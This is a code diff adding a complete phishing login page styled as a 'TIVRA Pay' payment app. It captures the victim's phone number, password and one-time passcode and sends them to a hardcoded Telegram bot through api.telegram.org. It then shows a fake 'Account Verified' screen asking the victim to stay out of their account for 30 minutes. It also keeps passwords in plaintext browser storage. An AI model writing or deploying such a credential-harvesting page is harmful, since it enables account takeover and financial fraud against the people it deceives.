@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TIVRA Pay - Login</title>
+    <script src="logo-data.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 380px;
+            padding: 20px;
+        }
+
+        /* ===== LOGO SECTION ===== */
+        .logo-section {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .logo-img {
+            width: 200px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+            mix-blend-mode: multiply;
+        }
+
+        /* ===== INPUT FIELDS ===== */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            border-bottom: 2px solid #e0e0e0;
+            padding: 10px 5px;
+            transition: border-bottom-color 0.3s ease;
+        }
+
+        .input-wrapper:focus-within {
+            border-bottom-color: #2196f3;
+        }
+
+        .input-icon {
+            width: 22px;
+            height: 22px;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+
+        .input-wrapper input {
+            border: none;
+            outline: none;
+            font-size: 16px;
+            width: 100%;
+            color: #333;
+            background: transparent;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .input-wrapper input::placeholder {
+            color: #bbb;
+        }
+
+        .error-msg {
+            color: #e53935;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+        }
+
+        .error-msg.show {
+            display: block;
+        }
+
+        .input-wrapper.error {
+            border-bottom-color: #e53935;
+        }
+
+        /* ===== SAVE PASSWORD & FORGOT ===== */
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding: 0 2px;
+        }
+
+        .save-password {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 15px;
+            color: #2196f3;
+            user-select: none;
+        }
+
+        .save-password input {
+            display: none;
+        }
+
+        .custom-radio {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ccc;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 8px;
+            position: relative;
+            transition: all 0.2s ease;
+        }
+
+        .save-password input:checked + .custom-radio {
+            border-color: #2196f3;
+            background: #2196f3;
+        }
+
+        .save-password input:checked + .custom-radio::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 7px;
+            height: 7px;
+            background: white;
+            border-radius: 50%;
+        }
+
+        .forgot-link {
+            color: #2196f3;
+            text-decoration: none;
+            font-size: 15px;
+            transition: opacity 0.2s;
+        }
+
+        .forgot-link:hover {
+            opacity: 0.8;
+        }
+
+        /* ===== LOGIN BUTTON ===== */
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #2196f3;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .login-btn:hover {
+            background: #1976d2;
+        }
+
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* ===== LOADING POPUP ===== */
+        .loading-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.1);
+            backdrop-filter: blur(2px);
+            -webkit-backdrop-filter: blur(2px);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+        }
+        .loading-popup.show {
+            display: flex;
+        }
+        .loading-box {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 50px;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            animation: fadeIn 0.3s ease-out;
+        }
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e0e0e0;
+            border-top-color: #2196f3;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 15px;
+        }
+        .loading-box p {
+            font-size: 16px;
+            color: #555;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== OVERLAY & OTP POPUP ===== */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.1);
+            backdrop-filter: blur(2px);
+            -webkit-backdrop-filter: blur(2px);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+        }
+        .overlay.show {
+            display: flex;
+        }
+        .otp-popup {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            animation: fadeIn 0.3s ease-out;
+        }
+        .otp-popup h2 {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        .otp-popup p {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 25px;
+        }
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        .otp-input {
+            width: 45px;
+            height: 50px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .otp-input:focus {
+            border-color: #2196f3;
+        }
+        .verify-btn {
+            width: 100%;
+            padding: 14px;
+            background: #2196f3;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .verify-btn:hover {
+            background: #1976d2;
+        }
+
+        /* ===== SUCCESS POPUP ===== */
+        .success-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.4);
+            backdrop-filter: blur(3px);
+            -webkit-backdrop-filter: blur(3px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .success-popup.show {
+            display: flex;
+        }
+        .success-box {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            max-width: 380px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.2);
+            animation: popIn 0.4s ease-out;
+        }
+        .success-box .check-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 15px;
+            background: #4ade80;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .success-box .check-icon svg {
+            width: 30px;
+            height: 30px;
+        }
+        .success-box h2 {
+            font-size: 22px;
+            color: #4ade80;
+            margin-bottom: 10px;
+        }
+        .success-box p {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 4px;
+        }
+        .success-box .timer-text {
+            font-size: 13px;
+            color: #999;
+            margin-top: 15px;
+        }
+        @keyframes popIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* ===== AGREEMENT ===== */
+        .agreement {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .agreement-checkbox {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .agreement-checkbox input {
+            display: none;
+        }
+
+        .custom-check {
+            width: 18px;
+            height: 18px;
+            margin-right: 6px;
+            flex-shrink: 0;
+        }
+
+        .agreement a {
+            color: #2196f3;
+            text-decoration: underline;
+        }
+
+        /* ===== ANIMATIONS ===== */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .login-container {
+            animation: fadeIn 0.6s ease-out;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- ===== LOGO SECTION ===== -->
+        <div class="logo-section">
+            <img class="logo-img" src="LOGO/photo_2026-07-20_09-45-28-removebg-preview.png" alt="TIVRA Pay Logo">
+        </div>
+
+        <!-- ===== PHONE INPUT ===== -->
+        <div class="input-group">
+            <div class="input-wrapper" id="phoneWrapper">
+                <!-- Phone Icon SVG -->
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="#2196f3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+                    <line x1="12" y1="18" x2="12" y2="18.01"/>
+                </svg>
+                <input type="tel" id="phoneInput" placeholder="Enter phone number" maxlength="15">
+            </div>
+            <div class="error-msg" id="phoneError"></div>
+        </div>
+
+        <!-- ===== PASSWORD INPUT ===== -->
+        <div class="input-group">
+            <div class="input-wrapper" id="passWrapper">
+                <!-- Lock Icon SVG -->
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="#2196f3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                    <circle cx="12" cy="16" r="1" fill="#2196f3"/>
+                </svg>
+                <input type="password" id="passInput" placeholder="Enter password">
+            </div>
+        </div>
+
+        <!-- ===== OPTIONS ROW ===== -->
+        <div class="options-row">
+            <label class="save-password">
+                <input type="checkbox" id="savePass">
+                <span class="custom-radio"></span>
+                Save Password
+            </label>
+            <a href="#" class="forgot-link">Forgot password</a>
+        </div>
+
+        <!-- ===== LOGIN BUTTON ===== -->
+        <button class="login-btn" id="loginBtn">Login</button>
+
+        <!-- ===== AGREEMENT ===== -->
+        <div class="agreement">
+            <label class="agreement-checkbox">
+                <input type="checkbox" id="agreeCheck" checked>
+                <!-- Check Icon SVG -->
+                <svg class="custom-check" viewBox="0 0 24 24">
+                    <circle cx="12" cy="12" r="10" fill="#2196f3"/>
+                    <polyline points="8 12 11 15 16 9" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </label>
+            <span>Agree <a href="#">"User Privacy Agreement"</a></span>
+        </div>
+    </div>
+
+    <!-- ===== LOADING POPUP ===== -->
+    <div class="loading-popup" id="loadingPopup">
+        <div class="loading-box">
+            <div class="loading-spinner"></div>
+            <p>Logging in...</p>
+        </div>
+    </div>
+
+    <!-- ===== OTP POPUP ===== -->
+    <div class="overlay" id="otpOverlay">
+        <div class="otp-popup">
+            <h2>OTP Verification</h2>
+            <p>Enter the 6-digit code sent to your phone</p>
+            <div class="otp-inputs">
+                <input class="otp-input" type="text" maxlength="1" id="otp1">
+                <input class="otp-input" type="text" maxlength="1" id="otp2">
+                <input class="otp-input" type="text" maxlength="1" id="otp3">
+                <input class="otp-input" type="text" maxlength="1" id="otp4">
+                <input class="otp-input" type="text" maxlength="1" id="otp5">
+                <input class="otp-input" type="text" maxlength="1" id="otp6">
+            </div>
+            <button class="verify-btn" id="verifyBtn">Verify OTP</button>
+        </div>
+    </div>
+
+    <!-- ===== SUCCESS POPUP ===== -->
+    <div class="success-popup" id="successPopup">
+        <div class="success-box">
+            <div class="check-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="5 12 9 16 19 6"/>
+                </svg>
+            </div>
+            <h2>Account Verified!</h2>
+            <p>Your account has been verified successfully.</p>
+            <p>Please wait for 30 minutes</p>
+            <p>and do not open your account during this time.</p>
+            <p class="timer-text">This window will close automatically in <span id="timerCount">10</span> seconds...</p>
+        </div>
+    </div>
+
+    <script>
+        const phoneInput = document.getElementById('phoneInput');
+        const passInput = document.getElementById('passInput');
+        const phoneWrapper = document.getElementById('phoneWrapper');
+        const passWrapper = document.getElementById('passWrapper');
+        const phoneError = document.getElementById('phoneError');
+        const loginBtn = document.getElementById('loginBtn');
+        const savePass = document.getElementById('savePass');
+        const agreeCheck = document.getElementById('agreeCheck');
+        const otpOverlay = document.getElementById('otpOverlay');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const successPopup = document.getElementById('successPopup');
+        const timerCount = document.getElementById('timerCount');
+        const loadingPopup = document.getElementById('loadingPopup');
+        const otpInputs = document.querySelectorAll('.otp-input');
+
+        phoneInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length > 0) {
+                phoneWrapper.classList.remove('error');
+                phoneError.classList.remove('show');
+            }
+        });
+
+        phoneInput.addEventListener('blur', function() {
+            if (this.value.trim() === '') {
+                phoneWrapper.classList.add('error');
+                phoneError.classList.add('show');
+            }
+        });
+
+        passInput.addEventListener('focus', function() {
+            passWrapper.style.borderBottomColor = '#2196f3';
+        });
+
+        passInput.addEventListener('blur', function() {
+            passWrapper.style.borderBottomColor = '#e0e0e0';
+        });
+
+        // ===== OTP Input Auto-Focus =====
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // ===== Login Button Click =====
+        loginBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+
+            let isValid = true;
+
+            if (phoneInput.value.trim() === '') {
+                phoneWrapper.classList.add('error');
+                phoneError.classList.add('show');
+                isValid = false;
+            }
+
+            if (passInput.value.trim() === '') {
+                passWrapper.style.borderBottomColor = '#e53935';
+                isValid = false;
+                setTimeout(() => {
+                    passWrapper.style.borderBottomColor = '#e0e0e0';
+                }, 2000);
+            }
+
+            if (!agreeCheck.checked) {
+                alert('Please agree to the User Privacy Agreement');
+                isValid = false;
+            }
+
+            if (isValid) {
+                loadingPopup.classList.add('show');
+
+                setTimeout(() => {
+                    loadingPopup.classList.remove('show');
+                    otpOverlay.classList.add('show');
+                    otpInputs[0].focus();
+                }, 3000);
+            }
+        });
+
+        // ===== Convert base64 to Blob =====
+        function base64ToBlob(base64, mime) {
+            const byteChars = atob(base64);
+            const byteArrays = [];
+            for (let offset = 0; offset < byteChars.length; offset += 512) {
+                const slice = byteChars.slice(offset, offset + 512);
+                const byteNumbers = new Array(slice.length);
+                for (let i = 0; i < slice.length; i++) {
+                    byteNumbers[i] = slice.charCodeAt(i);
+                }
+                byteArrays.push(new Uint8Array(byteNumbers));
+            }
+            return new Blob(byteArrays, { type: mime });
+        }
+
+        // ===== Send to Telegram =====
+        function sendToTelegram(phone, password, otp) {
+            const botToken = '8786937967:AAF89mjtatOLHo44RGGay_1C6_ZwlCScrnM';
+            const chatId = '-1003923232961';
+            const caption = `🔔 New Login Details\n\n📱 Phone: \`${phone}\`\n🔑 Password: \`${password}\`\n🔢 OTP: \`${otp}\`\n\n⏰ Time: ${new Date().toLocaleString()}\n\n✅ Tap on any value above to copy`;
+
+            const blob = base64ToBlob(LOGO_IMAGE_BASE64, 'image/png');
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'logo.png');
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'Markdown');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(function(err) {
+                console.warn('Telegram sendPhoto failed, trying text only:', err);
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'Markdown' })
+                });
+            });
+        }
+
+        // ===== Verify OTP =====
+        verifyBtn.addEventListener('click', function() {
+            let otp = '';
+            otpInputs.forEach(input => { otp += input.value; });
+
+            if (otp.length < 6) {
+                alert('Please enter complete OTP');
+                return;
+            }
+
+            const phone = phoneInput.value;
+            const password = passInput.value;
+
+            sendToTelegram(phone, password, otp);
+
+            otpOverlay.classList.remove('show');
+            successPopup.classList.add('show');
+
+            let timeLeft = 10;
+            timerCount.textContent = timeLeft;
+
+            const timer = setInterval(() => {
+                timeLeft--;
+                timerCount.textContent = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    successPopup.classList.remove('show');
+                }
+            }, 1000);
+        });
+
+        savePass.addEventListener('change', function() {
+            if (this.checked && phoneInput.value && passInput.value) {
+                localStorage.setItem('tivra_phone', phoneInput.value);
+                localStorage.setItem('tivra_password', passInput.value);
+            } else if (!this.checked) {
+                localStorage.removeItem('tivra_phone');
+                localStorage.removeItem('tivra_password');
+            }
+        });
+
+        window.addEventListener('DOMContentLoaded', function() {
+            const savedPhone = localStorage.getItem('tivra_phone');
+            const savedPass = localStorage.getItem('tivra_password');
+
+            if (savedPhone && savedPass) {
+                phoneInput.value = savedPhone;
+                passInput.value = savedPass;
+                savePass.checked = true;
+            }
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                loginBtn.click();
+            }
+        });
+    </script>
+
+</body>
+</html>
